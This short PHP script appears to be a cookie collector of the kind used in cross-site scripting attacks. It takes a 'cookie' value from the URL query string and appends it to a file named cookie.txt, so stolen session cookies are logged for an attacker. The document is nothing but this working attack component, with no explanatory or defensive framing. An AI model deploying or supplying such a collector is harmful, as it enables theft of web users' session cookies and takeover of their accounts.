<?php
  $cookie = $_GET['cookie'];
  $fp = fopen('cookie.txt', 'a');
  fwrite($fp, $cookie);
  fclose($fp);
?>
